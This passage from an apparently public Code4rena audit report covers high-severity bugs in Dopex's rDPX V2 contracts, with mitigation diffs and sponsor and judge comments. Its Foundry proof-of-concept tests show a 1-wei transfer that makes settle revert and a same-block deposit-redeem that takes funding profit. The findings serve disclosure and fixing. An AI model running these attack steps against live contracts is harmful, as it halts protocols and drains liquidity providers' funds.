[nirlin](https://github.com/code-423n4/2023-08-dopex-findings/issues/1586), [ak1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1571), [jasonxiale](https://github.com/code-423n4/2023-08-dopex-findings/issues/1567), [pontifex](https://github.com/code-423n4/2023-08-dopex-findings/issues/1566), [Aymen0909](https://github.com/code-423n4/2023-08-dopex-findings/issues/1549), [DanielArmstrong](https://github.com/code-423n4/2023-08-dopex-findings/issues/1517), [AkshaySrivastav](https://github.com/code-423n4/2023-08-dopex-findings/issues/1515), [savi0ur](https://github.com/code-423n4/2023-08-dopex-findings/issues/1514), [RED-LOTUS-REACH](https://github.com/code-423n4/2023-08-dopex-findings/issues/1469), [crunch](https://github.com/code-423n4/2023-08-dopex-findings/issues/1392), [sces60107](https://github.com/code-423n4/2023-08-dopex-findings/issues/1390), [pks\_](https://github.com/code-423n4/2023-08-dopex-findings/issues/1382), Mike\_Bello90 ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1340), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/1256)), [tnquanghuy0512](https://github.com/code-423n4/2023-08-dopex-findings/issues/1326), [circlelooper](https://github.com/code-423n4/2023-08-dopex-findings/issues/1314), [ubermensch](https://github.com/code-423n4/2023-08-dopex-findings/issues/1293), [asui](https://github.com/code-423n4/2023-08-dopex-findings/issues/1261), [oakcobalt](https://github.com/code-423n4/2023-08-dopex-findings/issues/1201), [bart1e](https://github.com/code-423n4/2023-08-dopex-findings/issues/1197), Anirruth ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1190), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/518)), [0xklh](https://github.com/code-423n4/2023-08-dopex-findings/issues/1171), [blutorque](https://github.com/code-423n4/2023-08-dopex-findings/issues/1167), [Baki](https://github.com/code-423n4/2023-08-dopex-findings/issues/1165), [Snow24](https://github.com/code-423n4/2023-08-dopex-findings/issues/1152), [Yanchuan](https://github.com/code-423n4/2023-08-dopex-findings/issues/1133), [Jiamin](https://github.com/code-423n4/2023-08-dopex-findings/issues/1109), [SBSecurity](https://github.com/code-423n4/2023-08-dopex-findings/issues/1095), [kutugu](https://github.com/code-423n4/2023-08-dopex-findings/issues/1091), [LokiThe5th](https://github.com/code-423n4/2023-08-dopex-findings/issues/1083), [Juntao](https://github.com/code-423n4/2023-08-dopex-findings/issues/1076), [nobody2018](https://github.com/code-423n4/2023-08-dopex-findings/issues/1049), [juancito](https://github.com/code-423n4/2023-08-dopex-findings/issues/1019), [carrotsmuggler](https://github.com/code-423n4/2023-08-dopex-findings/issues/1017), [ladboy233](https://github.com/code-423n4/2023-08-dopex-findings/issues/981), [mert\_eren](https://github.com/code-423n4/2023-08-dopex-findings/issues/932), [BugzyVonBuggernaut](https://github.com/code-423n4/2023-08-dopex-findings/issues/920), [GangsOfBrahmin](https://github.com/code-423n4/2023-08-dopex-findings/issues/892), [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/873), [rokinot](https://github.com/code-423n4/2023-08-dopex-findings/issues/806), [ayden](https://github.com/code-423n4/2023-08-dopex-findings/issues/771), [0xDING99YA](https://github.com/code-423n4/2023-08-dopex-findings/issues/754), [lanrebayode77](https://github.com/code-423n4/2023-08-dopex-findings/issues/749), [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/742), [chainsnake](https://github.com/code-423n4/2023-08-dopex-findings/issues/723), [T1MOH](https://github.com/code-423n4/2023-08-dopex-findings/issues/674), [Inspex](https://github.com/code-423n4/2023-08-dopex-findings/issues/662), [gjaldon](https://github.com/code-423n4/2023-08-dopex-findings/issues/619), [SpicyMeatball](https://github.com/code-423n4/2023-08-dopex-findings/issues/592), [LFGSecurity](https://github.com/code-423n4/2023-08-dopex-findings/issues/582), [ke1caM](https://github.com/code-423n4/2023-08-dopex-findings/issues/571), [Norah](https://github.com/code-423n4/2023-08-dopex-findings/issues/542), [auditsea](https://github.com/code-423n4/2023-08-dopex-findings/issues/517), [dirk\_y](https://github.com/code-423n4/2023-08-dopex-findings/issues/488), [max10afternoon](https://github.com/code-423n4/2023-08-dopex-findings/issues/480), [tapir](https://github.com/code-423n4/2023-08-dopex-findings/issues/464), [spidy730](https://github.com/code-423n4/2023-08-dopex-findings/issues/437), [HChang26](https://github.com/code-423n4/2023-08-dopex-findings/issues/417), [grearlake](https://github.com/code-423n4/2023-08-dopex-findings/issues/394), [0xCiphky](https://github.com/code-423n4/2023-08-dopex-findings/issues/373), [chaduke](https://github.com/code-423n4/2023-08-dopex-findings/issues/370), [volodya](https://github.com/code-423n4/2023-08-dopex-findings/issues/362), [sl1](https://github.com/code-423n4/2023-08-dopex-findings/issues/343), [0x3b](https://github.com/code-423n4/2023-08-dopex-findings/issues/324), [Nyx](https://github.com/code-423n4/2023-08-dopex-findings/issues/305), [kodyvim](https://github.com/code-423n4/2023-08-dopex-findings/issues/249), [ravikiranweb3](https://github.com/code-423n4/2023-08-dopex-findings/issues/228), [ABA](https://github.com/code-423n4/2023-08-dopex-findings/issues/197), [0xWaitress](https://github.com/code-423n4/2023-08-dopex-findings/issues/161), [0xsurena](https://github.com/code-423n4/2023-08-dopex-findings/issues/131), [rvierdiiev](https://github.com/code-423n4/2023-08-dopex-findings/issues/126), [degensec](https://github.com/code-423n4/2023-08-dopex-findings/issues/124), [Kow](https://github.com/code-423n4/2023-08-dopex-findings/issues/119), [Krace](https://github.com/code-423n4/2023-08-dopex-findings/issues/13), [mahdikarimi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1270), and [sh1v](https://github.com/code-423n4/2023-08-dopex-findings/issues/2193)*

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L359-L361> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L772-L774>

`RdpxV2Core.settle` reverts and the protocol stops.

### Proof of Concept

If a collateral token(WETH) is arbitrarily sent to PerpetualAtlanticVaultLP, the values of `collateral.balanceOf(address(this))` and `_totalCollateral` will be different.

Since `PerpetualAtlanticVaultLP.subtractLoss` requires that `collateral.balanceOf(address(this))` exactly match with `_totalCollateral - loss`, `PerpetualAtlanticVaultLP.subtractLoss` will be failed if an attacker arbitrarily transfers collateral tokens to the PerpetualAtlanticVaultLP contract.

```solidity
function subtractLoss(uint256 loss) public onlyPerpVault {
  require(
    collateral.balanceOf(address(this)) == _totalCollateral - loss,
    "Not enough collateral was sent out"
  );
  _totalCollateral -= loss;
}
```

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205>

Since there is no function that synchronizes `_totalCollateral` with `collateral.balanceOf(address(this))` without moving tokens, even admin cannot fix.

This is exploit PoC. Add this test case at `tests/perp-vault/Unit.t.sol`

```solidity
function testSettlePoC() public {
  weth.mint(address(1), 1 ether);
  weth.mint(address(777), 1 ether); // give some tokens to attacker

  deposit(1 ether, address(1));

  vault.purchase(1 ether, address(this));

  uint256[] memory ids = new uint256[](1);
  ids[0] = 0;

  skip(86500); // expire

  priceOracle.updateRdpxPrice(0.010 gwei); // ITM
  uint256 wethBalanceBefore = weth.balanceOf(address(this));
  uint256 rdpxBalanceBefore = rdpx.balanceOf(address(this));

  // attack
  vm.startPrank(address(777), address(777));
  weth.transfer(address(vaultLp), 1); // send 1 wei of collateral
  vm.stopPrank();

  vm.expectRevert("Not enough collateral was sent out");
  vault.settle(ids);
}
```

### Recommended Mitigation Steps

Use `>=` instead of `==` at `PerpetualAtlanticVaultLP.subtractLoss`

```diff
function subtractLoss(uint256 loss) public onlyPerpVault {
  require(
-   collateral.balanceOf(address(this)) == _totalCollateral - loss,
+   collateral.balanceOf(address(this)) >= _totalCollateral - loss,
    "Not enough collateral was sent out"
  );
  _totalCollateral -= loss;
}
```

**[psytama (Dopex) confirmed via duplicate issue 619](https://github.com/code-423n4/2023-08-dopex-findings/issues/619)**


***

## [[H-04] `UniV3LiquidityAMO::recoverERC721` will cause `ERC721` tokens to be permanently locked in `rdpxV2Core`](https://github.com/code-423n4/2023-08-dopex-findings/issues/935)
*Submitted by [bart1e](https://github.com/code-423n4/2023-08-dopex-findings/issues/935), also found by [rokinot](https://github.com/code-423n4/2023-08-dopex-findings/issues/2228), [gkrastenov](https://github.com/code-423n4/2023-08-dopex-findings/issues/2124), [HHK](https://github.com/code-423n4/2023-08-dopex-findings/issues/1925), [bin2chen](https://github.com/code-423n4/2023-08-dopex-findings/issues/1783), [jasonxiale](https://github.com/code-423n4/2023-08-dopex-findings/issues/1637), [Aymen0909](https://github.com/code-423n4/2023-08-dopex-findings/issues/1536), [josephdara](https://github.com/code-423n4/2023-08-dopex-findings/issues/1507), [pep7siup](https://github.com/code-423n4/2023-08-dopex-findings/issues/1409), [peakbolt](https://github.com/code-423n4/2023-08-dopex-findings/issues/739), [Inspex](https://github.com/code-423n4/2023-08-dopex-findings/issues/663), [kodyvim](https://github.com/code-423n4/2023-08-dopex-findings/issues/585), [tapir](https://github.com/code-423n4/2023-08-dopex-findings/issues/455), [0x3b](https://github.com/code-423n4/2023-08-dopex-findings/issues/429), [0xCiphky](https://github.com/code-423n4/2023-08-dopex-findings/issues/377), [rvierdiiev](https://github.com/code-423n4/2023-08-dopex-findings/issues/281), and [chaduke](https://github.com/code-423n4/2023-08-dopex-findings/issues/106)*

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L324-L334> 

<https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1-L1308>

`UniV3LiquidityAMO::recoverERC721` is a function created in order to be able to recover `ERC721` tokens from the `UniV3LiquidityAMO` contract. It can only be called by admin and will transfer all `ERC721` tokens to the `RdpxV2Core` contract. The problem is, that it won't be possible to do anything with these tokens after they are transferred to `rdpxV2Core`.

Indeed, `RdpxV2Core` inherits from the following contracts:

*   `AccessControl`,
*   `ContractWhitelist`,
*   `ERC721Holder`,
*   `Pausable`

and no contract from this list implement any logic allowing the NFT transfer (only `ERC721Holder` has something to do with NFTs, but it only allows to receive them, not to approve or transfer).

Moreover, `rdpxV2Core` also doesn't have any logic allowing transfer or approval of NFTs:

*   there is no generic `execute` function there
*   no function implemented is related to `ERC721` tokens (except for `onERC721Received` inherited from `ERC721Holder`)
*   it may seem possible to do a dirty hack and try to use `approveContractToSpend` in order to approve `ERC721` token. Theoretically, one would have to specify `ERC721` `tokenId` instead of `ERC20` token amount, so that `IERC20WithBurn(_token).approve(_spender, _amount);` in fact approves `ERC721` token with `tokenId == _amount`, but it fails with `[FAIL. Reason: EvmError: Revert]` and even if it didn't, it still wouldn't be possible to transfer `ERC721` token with `tokenId == 0` since there is `_validate(_amount > 0, 17);` inside `approveContractToSpend`

### Impact

`UniV3LiquidityAMO::recoverERC721` instead of recovering `ERC721`, locks all tokens in `rdpxV2Core` and it won't be possible to recover them from that contract.

**Any use of `recoverERC721` will imply an irrecoverable loss for the protocol** and this function was implemented in order to be used at some point after all (even if only on emergency situations). Because of that, I'm submitting this issue as High.

### Proof of Concept

This PoC only shows that `ERC721` token recovery will not be possible by calling `RdpxV2Core::approveContractToSpend`. Lack of functions doing `transfer` or `approve` or any other `ERC721` related functions in `RdpxV2Core` may just be observed by looking at the contract's code.

Please create the `MockERC721.sol` file in `mocks` directory and with the following code:

```solidity
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract MockERC721 is ERC721
{
    constructor() ERC721("...", "...")
    {

    }

    function giveNFT() public
    {
        _mint(msg.sender, 1);
    }
}
```

It will just mint an `ERC721` token with `tokenId = 1`.
Please also run the following test:

```solidity
  function testNFT() public
  {
    // needed `import "../../contracts/mocks/MockERC721.sol";` at the beginning of the file

    MockERC721 mockERC721 = new MockERC721();
    mockERC721.giveNFT();
    mockERC721.transferFrom(address(this), address(rdpxV2Core), 1);
    
    // approveContractToSpend won't be possible to use
    vm.expectRevert();
    rdpxV2Core.approveContractToSpend(address(mockERC721), address(this), 1);
  }
```

### Tools Used

VS Code

### Recommended Mitigation Steps

Either implement additional `ERC721` recovery function in `RdpxV2Core` or change `UniV3LiquidityAMO::recoverERC721` so that it transfers all NFTs to `msg.sender` instead of `RdpxV2Core` contract.

**[psytama (Dopex) confirmed and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/935#issuecomment-1733780469):**
 > Change recover ERC721 function in uni v3 AMO.

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/935#issuecomment-1755829336):**
 > The Warden has shown an incorrect hardcoded address in the `recoverERC721` if used it would cause an irrevocable loss of funds
> 
> Technically speaking the Sponsor could use `execute` as a replacement, however the default function causes a loss so I'm inclined to agree with High Severity

***

## [[H-05] Users can get immediate profit when deposit and redeem in `PerpetualAtlanticVaultLP`](https://github.com/code-423n4/2023-08-dopex-findings/issues/867)
*Submitted by [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/867), also found by [0xkazim](https://github.com/code-423n4/2023-08-dopex-findings/issues/2196), glcanvas ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/2127), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/1449)), [Toshii](https://github.com/code-423n4/2023-08-dopex-findings/issues/2095), [KrisApostolov](https://github.com/code-423n4/2023-08-dopex-findings/issues/2051), [HHK](https://github.com/code-423n4/2023-08-dopex-findings/issues/1948), [Tendency](https://github.com/code-423n4/2023-08-dopex-findings/issues/1875), [Evo](https://github.com/code-423n4/2023-08-dopex-findings/issues/1856), [bin2chen](https://github.com/code-423n4/2023-08-dopex-findings/issues/1796), [bart1e](https://github.com/code-423n4/2023-08-dopex-findings/issues/1592), peakbolt ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1570), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/999), [3](https://github.com/code-423n4/2023-08-dopex-findings/issues/737)), AkshaySrivastav ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1533), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/1073)), [0Kage](https://github.com/code-423n4/2023-08-dopex-findings/issues/1450), [sces60107](https://github.com/code-423n4/2023-08-dopex-findings/issues/1370), [qpzm](https://github.com/code-423n4/2023-08-dopex-findings/issues/1344), [ubermensch](https://github.com/code-423n4/2023-08-dopex-findings/issues/1289), [mahdikarimi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1264), 836541 ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/1253), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/845)), [Neon2835](https://github.com/code-423n4/2023-08-dopex-findings/issues/1163), [nobody2018](https://github.com/code-423n4/2023-08-dopex-findings/issues/1050), [carrotsmuggler](https://github.com/code-423n4/2023-08-dopex-findings/issues/1015), [lanrebayode77](https://github.com/code-423n4/2023-08-dopex-findings/issues/730), [tapir](https://github.com/code-423n4/2023-08-dopex-findings/issues/463), [volodya](https://github.com/code-423n4/2023-08-dopex-findings/issues/412), [gjaldon](https://github.com/code-423n4/2023-08-dopex-findings/issues/395), 0xCiphky ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/379), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/375)), [HChang26](https://github.com/code-423n4/2023-08-dopex-findings/issues/295), [max10afternoon](https://github.com/code-423n4/2023-08-dopex-findings/issues/288), rvierdiiev ([1](https://github.com/code-423n4/2023-08-dopex-findings/issues/237), [2](https://github.com/code-423n4/2023-08-dopex-findings/issues/121)), [chaduke](https://github.com/code-423n4/2023-08-dopex-findings/issues/52), [QiuhaoLi](https://github.com/code-423n4/2023-08-dopex-findings/issues/1907), [etherhood](https://github.com/code-423n4/2023-08-dopex-findings/issues/1870), and [josephdara](https://github.com/code-423n4/2023-08-dopex-findings/issues/2169)*

Due to wrong order between `previewDeposit` and `updateFunding` inside `PerpetualAtlanticVaultLP.deposit`. In some case, user can get immediate profit when call `deposit` and `redeem` in the same block.

### Proof of Concept

When `deposit` is called, first `previewDeposit` will be called to get the `shares` based on `assets` provided.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135>

```solidity
  function deposit(
    uint256 assets,
    address receiver
  ) public virtual returns (uint256 shares) {
    // Check for rounding error since we round down in previewDeposit.
>>> require((shares = previewDeposit(assets)) != 0, "ZERO_SHARES");

>>> perpetualAtlanticVault.updateFunding();

    // Need to transfer before minting or ERC777s could reenter.
    collateral.transferFrom(msg.sender, address(this), assets);

    _mint(receiver, shares);

    _totalCollateral += assets;

    emit Deposit(msg.sender, receiver, assets, shares);
  }
```

Inside  `previewDeposit`, it will call `convertToShares` to calculate the shares.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L269-L271>

```solidity
  function previewDeposit(uint256 assets) public view returns (uint256) {
    return convertToShares(assets);
  }
```

`convertToShares` calculate shares based on the provided `assets`, `supply` and `totalVaultCollateral`. `_totalCollateral` is also part of `totalVaultCollateral` that will be used inside the calculation.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L274-L284>

```solidity
  function convertToShares(
    uint256 assets
  ) public view returns (uint256 shares) {
    uint256 supply = totalSupply;
    uint256 rdpxPriceInAlphaToken = perpetualAtlanticVault.getUnderlyingPrice();

    uint256 totalVaultCollateral = totalCollateral() +
      ((_rdpxCollateral * rdpxPriceInAlphaToken) / 1e8);
    return
      supply == 0 ? assets : assets.mulDivDown(supply, totalVaultCollateral);
  }
```

After the shares calculation, `perpetualAtlanticVault.updateFunding` will be called, this function will send collateral to vault LP if conditions are met and increase `_totalCollateral`.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L502-L524>

```solidity
  function updateFunding() public {
    updateFundingPaymentPointer();
    uint256 currentFundingRate = fundingRates[latestFundingPaymentPointer];
    uint256 startTime = lastUpdateTime == 0
      ? (nextFundingPaymentTimestamp() - fundingDuration)
      : lastUpdateTime;
    lastUpdateTime = block.timestamp;

>>> collateralToken.safeTransfer(
      addresses.perpetualAtlanticVaultLP,
      (currentFundingRate * (block.timestamp - startTime)) / 1e18
    );

>>> IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).addProceeds(
      (currentFundingRate * (block.timestamp - startTime)) / 1e18
    );

    emit FundingPaid(
      msg.sender,
      ((currentFundingRate * (block.timestamp - startTime)) / 1e18),
      latestFundingPaymentPointer
    );
  }
```

It means if `_totalCollateral` is increased, user can get immediate profit when they call `redeem`.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L145-L175>

```solidity
  function redeem(
    uint256 shares,
    address receiver,
    address owner
  ) public returns (uint256 assets, uint256 rdpxAmount) {
    perpetualAtlanticVault.updateFunding();

    if (msg.sender != owner) {
      uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.

      if (allowed != type(uint256).max) {
        allowance[owner][msg.sender] = allowed - shares;
      }
    }
>>> (assets, rdpxAmount) = redeemPreview(shares);

    // Check for rounding error since we round down in previewRedeem.
    require(assets != 0, "ZERO_ASSETS");

    _rdpxCollateral -= rdpxAmount;

    beforeWithdraw(assets, shares);

    _burn(owner, shares);

    collateral.transfer(receiver, assets);

    IERC20WithBurn(rdpx).safeTransfer(receiver, rdpxAmount);

    emit Withdraw(msg.sender, receiver, owner, assets, shares);
  }
```

When `redeemPreview` is called and trigger `_convertToAssets`, it will used this newly increased `_totalCollateral`.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L218-L229>

```solidity
  function _convertToAssets(
    uint256 shares
  ) internal view virtual returns (uint256 assets, uint256 rdpxAmount) {
    uint256 supply = totalSupply;
    return
      (supply == 0)
        ? (shares, 0)
        : (
>>>       shares.mulDivDown(totalCollateral(), supply),
          shares.mulDivDown(_rdpxCollateral, supply)
        );
  }
```

This will open sandwich and MEV attack opportunity inside vault LP.

Foundry PoC :

Add this test to `Unit` contract inside `/tests/rdpxV2-core/Unit.t.sol`, also add `import "forge-std/console.sol";` in the contract :

```solidity
    function testSandwichProvideFunding() public {
        rdpxV2Core.bond(20 * 1e18, 0, address(this));
        rdpxV2Core.bond(20 * 1e18, 0, address(this));
        skip(86400 * 7);
        vault.addToContractWhitelist(address(rdpxV2Core));
        vault.updateFundingPaymentPointer();

        // test funding succesfully
        uint256[] memory strikes = new uint256[](1);
        strikes[0] = 15e6;
        // calculate funding is done properly
        vault.calculateFunding(strikes);

        uint256 funding = vault.totalFundingForEpoch(
            vault.latestFundingPaymentPointer()
        );

        // send funding to rdpxV2Core and call sync
        weth.transfer(address(rdpxV2Core), funding);
        rdpxV2Core.sync();
        rdpxV2Core.provideFunding();
        skip(86400 * 6);
        uint256 balanceBefore = weth.balanceOf(address(this));
        console.log("balance of eth before deposit and redeem:");
        console.log(balanceBefore);
        weth.approve(address(vaultLp), type(uint256).max);
        uint256 shares = vaultLp.deposit(1e18, address(this));
        vaultLp.redeem(shares, address(this), address(this));
        uint256 balanceAfter = weth.balanceOf(address(this));
        console.log("balance after deposit and redeem:");
        console.log(balanceAfter);
        console.log("immediate profit :");
        console.log(balanceAfter - balanceBefore);
    }
```

Run the test :

    forge test --match-contract Unit --match-test testSandwichProvideFunding -vvv

Log Output :

    Logs:
      balance of eth before deposit and redeem:
      18665279470073000000000

      balance after deposit and redeem:
      18665299797412715619861

      immediate profit :
      20327339715619861

### Recommended Mitigation Steps

Move `perpetualAtlanticVault.updateFunding` before `previewDeposit` is calculated.

```diff
  function deposit(
    uint256 assets,
    address receiver
  ) public virtual returns (uint256 shares) {
+    perpetualAtlanticVault.updateFunding();
    // Check for rounding error since we round down in previewDeposit.
    require((shares = previewDeposit(assets)) != 0, "ZERO_SHARES");

-    perpetualAtlanticVault.updateFunding();

    // Need to transfer before minting or ERC777s could reenter.
    collateral.transferFrom(msg.sender, address(this), assets);

    _mint(receiver, shares);

    _totalCollateral += assets;

    emit Deposit(msg.sender, receiver, assets, shares);
  }
```

**[witherblock (Dopex) disagreed with severity and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/867#issuecomment-1734035693):**
 > Please bump this to high

**[Alex the Entreprenerd (Judge) increased severity to High](https://github.com/code-423n4/2023-08-dopex-findings/issues/867#issuecomment-1759390605)**

***

## [[H-06] Bond operations will always revert at certain time when `putOptionsRequired` is true](https://github.com/code-423n4/2023-08-dopex-findings/issues/756)
*Submitted by [said](https://github.com/code-423n4/2023-08-dopex-findings/issues/756)*

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L481-L483> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L286> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L539-L551>

when `putOptionsRequired` is `true`, there is period of time where bond operations will always revert when try to purchase options from perp atlantic vault.

### Proof of Concept

When `bond` is called and `putOptionsRequired` is `true`, it will call `_purchaseOptions` providing the calculated `rdpxRequired`.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L920-L922>

```solidity
  function bond(
    uint256 _amount,
    uint256 rdpxBondId,
    address _to
  ) public returns (uint256 receiptTokenAmount) {
    _whenNotPaused();
    // Validate amount
    _validate(_amount > 0, 4);

    // Compute the bond cost
    (uint256 rdpxRequired, uint256 wethRequired) = calculateBondCost(
      _amount,
      rdpxBondId
    );

    IERC20WithBurn(weth).safeTransferFrom(
      msg.sender,
      address(this),
      wethRequired
    );

    // update weth reserve
    reserveAsset[reservesIndex["WETH"]].tokenBalance += wethRequired;

    // purchase options
    uint256 premium;
    if (putOptionsRequired) {
>>>   premium = _purchaseOptions(rdpxRequired);
    }

    _transfer(rdpxRequired, wethRequired - premium, _amount, rdpxBondId);

    // Stake the ETH in the ReceiptToken contract
    receiptTokenAmount = _stake(_to, _amount);

    // reLP
    if (isReLPActive) IReLP(addresses.reLPContract).reLP(_amount);

    emit LogBond(rdpxRequired, wethRequired, receiptTokenAmount);
  }
```

Inside `_purchaseOptions`, it will call `PerpetualAtlanticVault.purchase` providing the amount and `address(this)` as receiver :

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L471-L487>

```solidity
  function _purchaseOptions(
    uint256 _amount
  ) internal returns (uint256 premium) {
    /**
     * Purchase options and store ERC721 option id
     * Note that the amount of options purchased is the amount of rDPX received
     * from the user to sufficiently collateralize the underlying DpxEth stored in the bond
     **/
    uint256 optionId;

>>> (premium, optionId) = IPerpetualAtlanticVault(
      addresses.perpetualAtlanticVault
    ).purchase(_amount, address(this));

    optionsOwned[optionId] = true;
    reserveAsset[reservesIndex["WETH"]].tokenBalance -= premium;
  }
```

Then inside `purchase`, it will calculate `premium` using `calculatePremium` function, providing `strike`, `amount`, `timeToExpiry`.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L286>

```solidity
  function purchase(
    uint256 amount,
    address to
  )
    external
    nonReentrant
    onlyRole(RDPXV2CORE_ROLE)
    returns (uint256 premium, uint256 tokenId)
  {
    _whenNotPaused();
    _validate(amount > 0, 2);

    updateFunding();

    uint256 currentPrice = getUnderlyingPrice(); // price of underlying wrt collateralToken
    uint256 strike = roundUp(currentPrice - (currentPrice / 4)); // 25% below the current price
    IPerpetualAtlanticVaultLP perpetualAtlanticVaultLp = IPerpetualAtlanticVaultLP(
        addresses.perpetualAtlanticVaultLP
      );

    // Check if vault has enough collateral to write the options
    uint256 requiredCollateral = (amount * strike) / 1e8;

    _validate(
      requiredCollateral <= perpetualAtlanticVaultLp.totalAvailableCollateral(),
      3
    );

    uint256 timeToExpiry = nextFundingPaymentTimestamp() - block.timestamp;

    // Get total premium for all options being purchased
>>> premium = calculatePremium(strike, amount, timeToExpiry, 0);

    // ... rest of operations
  }
```

Inside this `calculatePremium`, it will get price from option pricing :

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L539-L551>

```solidity
  function calculatePremium(
    uint256 _strike,
    uint256 _amount,
    uint256 timeToExpiry,
    uint256 _price
  ) public view returns (uint256 premium) {
    premium = ((IOptionPricing(addresses.optionPricing).getOptionPrice(
      _strike,
      _price > 0 ? _price : getUnderlyingPrice(),
      getVolatility(_strike),
      timeToExpiry
    ) * _amount) / 1e8);
  }
```

The provided `OptionPricingSimple.getOptionPrice` will use Black-Scholes model to calculate the price :

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/libraries/BlackScholes.sol#L33-L89>

```solidity
  function calculate(
    uint8 optionType,
    uint256 price,
    uint256 strike,
    uint256 timeToExpiry,
    uint256 riskFreeRate,
    uint256 volatility
  ) internal pure returns (uint256) {
    bytes16 S = ABDKMathQuad.fromUInt(price);
    bytes16 X = ABDKMathQuad.fromUInt(strike);
    bytes16 T = ABDKMathQuad.div(
      ABDKMathQuad.fromUInt(timeToExpiry),
      ABDKMathQuad.fromUInt(36500) // 365 * 10 ^ DAYS_PRECISION
    );
    bytes16 r = ABDKMathQuad.div(
      ABDKMathQuad.fromUInt(riskFreeRate),
      ABDKMathQuad.fromUInt(10000)
    );
    bytes16 v = ABDKMathQuad.div(
      ABDKMathQuad.fromUInt(volatility),
      ABDKMathQuad.fromUInt(100)
    );
    bytes16 d1 = ABDKMathQuad.div(
      ABDKMathQuad.add(
        ABDKMathQuad.ln(ABDKMathQuad.div(S, X)),
        ABDKMathQuad.mul(
          ABDKMathQuad.add(
            r,
            ABDKMathQuad.mul(v, ABDKMathQuad.div(v, ABDKMathQuad.fromUInt(2)))
          ),
          T
        )
      ),
      ABDKMathQuad.mul(v, ABDKMathQuad.sqrt(T))
    );
    bytes16 d2 = ABDKMathQuad.sub(
      d1,
      ABDKMathQuad.mul(v, ABDKMathQuad.sqrt(T))
    );
    if (optionType == OPTION_TYPE_CALL) {
      return
        ABDKMathQuad.toUInt(
          ABDKMathQuad.mul(
            _calculateCallTimeDecay(S, d1, X, r, T, d2),
            ABDKMathQuad.fromUInt(DIVISOR)
          )
        );
    } else if (optionType == OPTION_TYPE_PUT) {
      return
        ABDKMathQuad.toUInt(
          ABDKMathQuad.mul(
            _calculatePutTimeDecay(X, r, T, d2, S, d1),
            ABDKMathQuad.fromUInt(DIVISOR)
          )
        );
    } else return 0;
  }
```

The problem lies inside `calculatePremium` due to not properly check if current time less than 864 seconds (around 14 minutes). because `getOptionPrice` will use time expiry in days multiply by 100.

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/libraries/OptionPricingSimple.sol#L72>

```solidity
uint256 timeToExpiry = (expiry * 100) / 86400;
```

If `nextFundingPaymentTimestamp() - block.timestamp` is less than 864 seconds, it will cause `timeToExpiry` inside option pricing is 0 and the call will always revert. This will cause an unexpected revert period around 14 minutes every funding epoch (in this case every week).

Foundry PoC :

Try to simulate `calculatePremium` when `nextFundingPaymentTimestamp() - block.timestamp` is less than 864 seconds.

